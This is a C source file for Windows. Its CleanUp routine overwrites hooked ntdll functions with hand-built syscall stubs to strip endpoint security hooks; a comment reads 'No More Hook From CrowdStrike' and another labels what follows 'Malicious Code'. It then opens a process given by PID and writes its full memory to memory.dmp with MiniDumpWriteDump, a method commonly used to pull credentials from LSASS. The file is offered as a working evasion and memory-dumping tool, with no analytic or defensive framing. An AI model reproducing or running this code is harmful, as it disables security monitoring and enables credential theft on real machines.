#include <Windows.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

VOID PatchHook(CHAR* address, unsigned char id, char high);

VOID CleanUp() {
    HANDLE hDll = LoadLibrary("ntdll.dll");
    FARPROC NtProtectVirtualMemory = GetProcAddress(hDll, "NtProtectVirtualMemory");
    FARPROC NtReadVirtualMemory = GetProcAddress(hDll, "NtReadVirtualMemory");

    PatchHook(NtProtectVirtualMemory, 0x50, 0x00);  // unhooking first since we are going to need it to unhook APIs
    PatchHook(NtReadVirtualMemory, 0x3f, 0x00);

    CloseHandle(hDll);
}

VOID PatchHook(CHAR* address, unsigned char id, char high) {
    DWORD dwSize = 11;
    CHAR* patch_address = address;
    //\x4c\x8b\xd1\xb8\xXX\xHH\x00\x00\x0f\x05\xc3
    CHAR* patch[dwSize];
    sprintf(patch, "\x4c\x8b\xd1\xb8%c%c%c%c\x0f\x05\xc3", id, high, high ^ high, high ^ high);

    DWORD dwOld;
    VirtualProtect(patch_address, dwSize, PAGE_EXECUTE_READWRITE, &dwOld);
    memcpy(patch_address, patch, dwSize);
}

int main (int argc, char **argv) {
    CleanUp();

    // No More Hook From CrowdStrike
    // Malicious Code
    DWORD PID = atoi(argv[1]);
    HANDLE hProc = NULL;
    HANDLE hFile = NULL;
    BOOL bSuccess = FALSE;
    BOOL(*MiniDumpWriteDump)(HANDLE, DWORD, HANDLE, DWORD, VOID*, VOID*, VOID*);

    MiniDumpWriteDump = (FARPROC)GetProcAddress(LoadLibrary("Dbghelp.dll"), "MiniDumpWriteDump");
    printf("MiniDumpWriteDump found at 0x%p\n", MiniDumpWriteDump);

    if(MiniDumpWriteDump == NULL) {
        printf("Can't resolve MiniDumpWriteDump. Exiting (%ld)\n", GetLastError());
        ExitProcess(0);
    }

    printf("Trying to dump PID: %d\n", PID);
    hProc = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, PID);
    printf("Process HANDLE 0x%p\n", hProc);

    if(hProc == NULL) {
        printf("HANDLE is NULL. Exiting (%ld)\n", GetLastError());
        ExitProcess(0);
    }

    hFile = CreateFile("memory.dmp", GENERIC_WRITE, FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    printf("memory.dmp HANDLE 0x%p\n", hFile);

    if(hFile == INVALID_HANDLE_VALUE) {
        printf("Can't create memory.dmp. Exiting (%ld)\n", GetLastError());
        CloseHandle(hProc);
        ExitProcess(0);
    }

    bSuccess = MiniDumpWriteDump(hProc, PID, hFile, 2, NULL, NULL, NULL);
    printf("Process Completed (%d)(%ld)", (DWORD)bSuccess, GetLastError());

    CloseHandle(hProc);
    CloseHandle(hFile);

    return 0;
}
